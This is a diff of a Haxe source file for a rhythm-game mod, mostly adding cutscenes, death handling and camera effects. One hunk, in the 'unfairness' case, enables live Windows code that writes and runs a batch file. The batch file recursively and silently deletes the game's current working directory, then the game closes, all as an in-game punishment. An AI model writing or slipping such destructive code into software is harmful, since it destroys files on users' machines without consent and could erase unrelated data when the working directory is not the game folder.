@@ -1609,13 +1609,14 @@ class PlayState extends MusicBeatState
 					FlxG.switchState(new PlayState());
 					return;
 				case 'unfairness':
-					#if false
-					if (curSong.toLowerCase() == 'unfairness')
-					{
-						File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
-						new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
-						Sys.exit(0);
-					}
+					#if windows
+					// make a batch file that will delete the game, run the batch file, then close the game
+					var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
+					File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
+					new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
+					Sys.exit(0);
+					#else
+					FlxG.switchState(new SusState());
 					#end
 				default:
 					FlxG.switchState(new ChartingState());
@@ -1719,20 +1720,24 @@ class PlayState extends MusicBeatState
 
 		if (health <= 0)
 		{
-			boyfriend.stunned = true;
-
-			persistentUpdate = false;
-			persistentDraw = false;
-			paused = true;
-
-			vocals.stop();
-			FlxG.sound.music.stop();
-
-			switch (curSong.toLowerCase())
+			if(!perfectMode)
 			{
-				case 'furiosity' | 'polygonized' | 'glitch':
-					screenshader.shader.uampmul.value[0] = 0;
-					screenshader.Enabled = false;
+				boyfriend.stunned = true;
+
+				persistentUpdate = false;
+				persistentDraw = false;
+				paused = true;
+	
+				vocals.stop();
+				FlxG.sound.music.stop();
+	
+				screenshader.shader.uampmul.value[0] = 0;
+				screenshader.Enabled = false;
+			}
+
+			if(shakeCam)
+			{
+				FlxG.save.data.unlockedcharacters[7] = true;
 			}
 
 			if (!shakeCam)
@@ -2225,6 +2230,24 @@ class PlayState extends MusicBeatState
 						doof.scrollFactor.set();
 						doof.finishThing = nextSong;
 						schoolIntro(doof, false);
+					case 'glitch':
+						canPause = false;
+						FlxG.sound.music.volume = 0;
+						vocals.volume = 0;
+						var marcello:FlxSprite = new FlxSprite(dad.x - 170, dad.y);
+						marcello.flipX = true;
+						add(marcello);
+						marcello.antialiasing = true;
+						marcello.color = 0xFF878787;
+						dad.visible = false;
+						boyfriend.stunned = true;
+						marcello.frames = Paths.getSparrowAtlas('dave/cutscene');
+						marcello.animation.addByPrefix('throw_phone', 'bambi0', 24, false);
+						FlxG.sound.play(Paths.sound('break_phone'), 1, false, null, true);
+						boyfriend.playAnim('hit', true);
+						STUPDVARIABLETHATSHOULDNTBENEEDED = marcello;
+						new FlxTimer().start(5.5, THROWPHONEMARCELLO);
+
 					default:
 						nextSong();
 				}
@@ -2232,30 +2255,62 @@ class PlayState extends MusicBeatState
 		}
 		else
 		{
-			switch (SONG.song.toLowerCase())
+			if(FlxG.save.data.freeplayCuts)
 			{
-				case 'glitch':
-					canPause = false;
-					FlxG.sound.music.volume = 0;
-					vocals.volume = 0;
-					var marcello:FlxSprite = new FlxSprite(dad.x - 170, dad.y);
-					marcello.flipX = true;
-					add(marcello);
-					marcello.antialiasing = true;
-					marcello.color = 0xFF878787;
-					dad.visible = false;
-					boyfriend.stunned = true;
-					marcello.frames = Paths.getSparrowAtlas('dave/cutscene');
-					marcello.animation.addByPrefix('throw_phone', 'bambi0', 24, false);
-					FlxG.sound.play(Paths.sound('break_phone'), 1, false, null, true);
-					boyfriend.playAnim('hit', true);
-					STUPDVARIABLETHATSHOULDNTBENEEDED = marcello;
-					new FlxTimer().start(5.5, THROWPHONEMARCELLO);
-				default:
-					FlxG.switchState(new FreeplayState());
+				switch (SONG.song.toLowerCase())
+				{
+					case 'glitch':
+						canPause = false;
+						FlxG.sound.music.volume = 0;
+						vocals.volume = 0;
+						var marcello:FlxSprite = new FlxSprite(dad.x - 170, dad.y);
+						marcello.flipX = true;
+						add(marcello);
+						marcello.antialiasing = true;
+						marcello.color = 0xFF878787;
+						dad.visible = false;
+						boyfriend.stunned = true;
+						marcello.frames = Paths.getSparrowAtlas('dave/cutscene');
+						marcello.animation.addByPrefix('throw_phone', 'bambi0', 24, false);
+						FlxG.sound.play(Paths.sound('break_phone'), 1, false, null, true);
+						boyfriend.playAnim('hit', true);
+						STUPDVARIABLETHATSHOULDNTBENEEDED = marcello;
+						new FlxTimer().start(5.5, THROWPHONEMARCELLO);
+					case 'insanity':
+						canPause = false;
+						FlxG.sound.music.volume = 0;
+						vocals.volume = 0;
+						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
+						boyfriend.stunned = true;
+						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('insanity/endDialogue')));
+						doof.scrollFactor.set();
+						doof.finishThing = ughWhyDoesThisHaveToFuckingExist;
+						schoolIntro(doof, false);
+					case 'maze':
+						canPause = false;
+						FlxG.sound.music.volume = 0;
+						vocals.volume = 0;
+						generatedMusic = false; // stop the game from trying to generate anymore music and to just cease attempting to play the music in general
+						boyfriend.stunned = true;
+						var doof:DialogueBox = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt('maze/endDialogue')));
+						doof.scrollFactor.set();
+						doof.finishThing = ughWhyDoesThisHaveToFuckingExist;
+						schoolIntro(doof, false);
+					default:
+						FlxG.switchState(new FreeplayState());
+				}
+			}
+			else
+			{
+				FlxG.switchState(new FreeplayState());
 			}
 			
 		}
+	}
+
+	function ughWhyDoesThisHaveToFuckingExist() 
+	{
+		FlxG.switchState(new FreeplayState());
 	}
 
 	var endingSong:Bool = false;
@@ -2878,7 +2933,21 @@ class PlayState extends MusicBeatState
 						gf.canDance = false;
 						boyfriend.playAnim('hey', true);
 						gf.playAnim('cheer', true);
-						FlxTween.tween(dad, {alpha: 0}, 2);
+						for (bgSprite in backgroundSprites)
+						{
+							FlxTween.tween(bgSprite, {alpha: 0}, 1);
+						}
+						for (bgSprite in normalDaveBG)
+						{
+							FlxTween.tween(bgSprite, {alpha: 1}, 1);
+						}
+						canFloat = false;
+						var position = dad.getPosition();
+						FlxG.camera.flash(FlxColor.WHITE, 0.25);
+						remove(dad);
+						dad = new Character(position.x, position.y, 'dave', false);
+						add(dad);
+						FlxTween.linearMotion(dad, dad.x, dad.y, 350, 260, 0.6, true);
 				}
 			case 'polygonized':
 				switch(curStep)
@@ -3024,16 +3093,18 @@ class PlayState extends MusicBeatState
 						}
 						canFloat = false;
 						var position = dad.getPosition();
+						FlxG.camera.flash(FlxColor.WHITE, 0.25);
 						remove(dad);
 						dad = new Character(position.x, position.y, 'dave', false);
 						add(dad);
-						FlxTween.linearMotion(dad, dad.x, dad.y, dad.x, dad.y, dad.x, dad.y, 350, 260, 0.6);
+						FlxTween.linearMotion(dad, dad.x, dad.y, 350, 260, 0.6, true);
 				}
 			case 'mealie':
 				switch (curBeat)
 				{
 					case 1776:
 						var position = dad.getPosition();
+						FlxG.camera.flash(FlxColor.WHITE, 0.25);
 						remove(dad);
 						dad = new Character(position.x, position.y, 'bambi-angey', false);
 						add(dad);
